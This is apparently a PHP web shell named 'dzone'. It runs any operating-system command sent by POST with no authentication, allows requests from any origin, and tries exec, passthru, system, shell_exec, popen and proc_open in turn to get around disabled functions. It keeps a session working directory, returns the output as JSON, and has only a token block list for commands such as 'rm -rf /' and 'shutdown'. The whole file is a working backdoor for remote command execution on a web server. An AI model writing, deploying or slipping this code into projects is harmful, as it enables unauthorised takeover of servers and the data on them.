<?php
@session_start();
@session_write_close();
@set_time_limit(0);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit();
}

// Initialize working directory - always use actual current directory first time
$actual_cwd = getcwd();

// Reload session to get stored directory
@session_start();
if(!isset($_SESSION['dzone_cwd'])) {
    $_SESSION['dzone_cwd'] = $actual_cwd;
}

$GLOBALS['cwd'] = $_SESSION['dzone_cwd'];
@session_write_close();
$GLOBALS['sys'] = (strtolower(substr(PHP_OS,0,3)) == "win") ? 'win' : 'unix';

function _dzone_php_cmd($in, $re = false) {
    $out = '';
    try {
        if($re) $in = $in." 2>&1";
        
        if(function_exists('exec')) {
            @exec($in, $out);
            $out = @join("\n", $out);
        } elseif(function_exists('passthru')) {
            ob_start();
            @passthru($in);
            $out = ob_get_clean();
        } elseif(function_exists('system')) {
            ob_start();
            @system($in);
            $out = ob_get_clean();
        } elseif(function_exists('shell_exec')) {
            $out = shell_exec($in);
        } elseif(function_exists("popen") && function_exists("pclose")) {
            if(is_resource($f = @popen($in, "r"))) {
                $out = "";
                while(!@feof($f))
                    $out .= fread($f, 1024);
                pclose($f);
            }
        } elseif(function_exists('proc_open')) {
            $pipes = array();
            $process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
            $out = @stream_get_contents($pipes[1]);
        }
    } catch(Exception $e) {}
    return $out;
}

function dzoneEx($in, $re = false) {
    return _dzone_php_cmd($in, $re);
}

function dzoneGetCwd() {
    if(function_exists("getcwd")) {
        return @getcwd();
    } else {
        return dirname($_SERVER["SCRIPT_FILENAME"]);
    }
}

function convertPermissions($perm_str) {
    // Convert rwx format to octal
    $perm = substr($perm_str, 1); // Remove first character (d, l, -, etc)
    $octal = '';
    
    for($i = 0; $i < 9; $i += 3) {
        $val = 0;
        if($perm[$i] == 'r') $val += 4;
        if($perm[$i+1] == 'w') $val += 2;
        if($perm[$i+2] == 'x' || $perm[$i+2] == 's' || $perm[$i+2] == 't') $val += 1;
        $octal .= $val;
    }
    
    return '0' . $octal;
}

function colorizePermissions($perm_str, $octal) {
    $type = $perm_str[0];
    $owner_w = $perm_str[2] == 'w';
    $group_w = $perm_str[5] == 'w';
    $other_w = $perm_str[8] == 'w';
    $owner_x = $perm_str[3] == 'x' || $perm_str[3] == 's';
    
    // Color logic: green if writable or executable by owner, red otherwise
    if($owner_w || $owner_x) {
        return "\x1b[32m{$octal}\x1b[0m"; // Green
    } else {
        return "\x1b[31m{$octal}\x1b[0m"; // Red
    }
}

function processLsOutput($output) {
    $lines = explode("\n", $output);
    $processed = array();
    
    foreach($lines as $line) {
        $line = trim($line);
        if(empty($line)) continue;
        
        // Check if it's a permission line (starts with d, l, - followed by rwx)
        if(preg_match('/^([dl\-])([rwx\-]{9})\s+/', $line, $matches)) {
            $full_perm = $matches[1] . $matches[2];
            $octal = convertPermissions($full_perm);
            $colored_octal = colorizePermissions($full_perm, $octal);
            
            // Replace permission with colored octal
            $line = preg_replace('/^([dl\-])([rwx\-]{9})/', $colored_octal, $line);
        }
        
        $processed[] = $line;
    }
    
    return $processed;
}

function dzoneterminalExec() {
    $pwd = "pwd";
    $separator = ";";
    
    if($GLOBALS['sys'] != 'unix') {
        $pwd = "cd";
        $separator = "&";
    }
    
    $command = trim($_POST['cmd']);
    $current_path = $GLOBALS['cwd'];
    
    // Check if it's a cd command
    if(preg_match("/^cd[ ]{0,}(.*)$/i", $command, $match)) {
        $target = trim($match[1]);
        
        // Handle special cd cases
        if(empty($target)) {
            $target = "~";
        }
        
        // Build cd command with current directory
        $full_cmd = "cd '".addslashes($GLOBALS['cwd'])."'".$separator."cd ".addslashes($target).$separator.$pwd." 2>&1";
        $result = dzoneEx($full_cmd);
        
        if(!empty($result)) {
            $lines = explode("\n", trim($result));
            $last_line = trim(end($lines));
            
            // Check if pwd returned a valid path (starts with /)
            if(!empty($last_line) && ($last_line[0] == '/' || strpos($last_line, ':') !== false)) {
                $GLOBALS['cwd'] = $last_line;
                $_SESSION['dzone_cwd'] = $last_line;
                @session_start();
                $_SESSION['dzone_cwd'] = $last_line;
                @session_write_close();
                
                return array(
                    "stdout" => array(),
                    "stderr" => array(),
                    "cwd" => $last_line,
                    "returnCode" => 0
                );
            } else {
                // cd failed, return error
                return array(
                    "stdout" => array(),
                    "stderr" => $lines,
                    "cwd" => $GLOBALS['cwd'],
                    "returnCode" => 1
                );
            }
        }
    }
    
    // For other commands, execute with current directory prefix
    $full_cmd = "cd '".addslashes($GLOBALS['cwd'])."'".$separator.$command." 2>&1";
    $out = dzoneEx($full_cmd);
    
    // Process ls commands for permission conversion
    if(preg_match("/^ls[\s\-]/", $command) || preg_match("/^ll/", $command)) {
        $clean_lines = processLsOutput($out);
    } else {
        // Clean output for other commands
        $lines = explode("\n", $out);
        $clean_lines = array();
        
        foreach($lines as $line) {
            $line = trim($line);
            if(!empty($line)) {
                $clean_lines[] = $line;
            }
        }
    }
    
    return array(
        "stdout" => $clean_lines,
        "stderr" => array(),
        "cwd" => $GLOBALS['cwd'],
        "returnCode" => 0
    );
}

// Handle request
$cmd = $_POST['cmd'] ?? '';

// Debug info
if($cmd === 'debug') {
    @session_start();
    echo json_encode([
        'stdout' => [
            'Current SESSION cwd: ' . ($_SESSION['dzone_cwd'] ?? 'not set'),
            'Current GLOBALS cwd: ' . $GLOBALS['cwd'],
            'PHP getcwd(): ' . $actual_cwd,
            'System: ' . $GLOBALS['sys'],
            'Script location: ' . dirname($_SERVER["SCRIPT_FILENAME"])
        ],
        'stderr' => [],
        'cwd' => $GLOBALS['cwd'],
        'returnCode' => 0
    ]);
    @session_write_close();
    exit();
}

// Reset session command
if($cmd === 'reset-session') {
    @session_start();
    $_SESSION['dzone_cwd'] = $actual_cwd;
    $GLOBALS['cwd'] = $actual_cwd;
    @session_write_close();
    
    echo json_encode([
        'stdout' => ['Session reset to: ' . $actual_cwd],
        'stderr' => [],
        'cwd' => $actual_cwd,
        'returnCode' => 0
    ]);
    exit();
}

if(empty(trim($cmd))) {
    echo json_encode([
        'stdout' => [],
        'stderr' => [],
        'cwd' => $GLOBALS['cwd'],
        'returnCode' => 0
    ]);
    exit();
}

// Security check
$blocked = ['rm -rf /', 'format', 'shutdown', 'reboot'];
foreach($blocked as $danger) {
    if(stripos($cmd, $danger) !== false) {
        echo json_encode([
            'stdout' => [],
            'stderr' => ['🔒 Command blocked for security'],
            'cwd' => $GLOBALS['cwd'],
            'returnCode' => 1
        ]);
        exit();
    }
}

// Execute command using dzone technique
$result = dzoneterminalExec();
echo json_encode($result);
?>
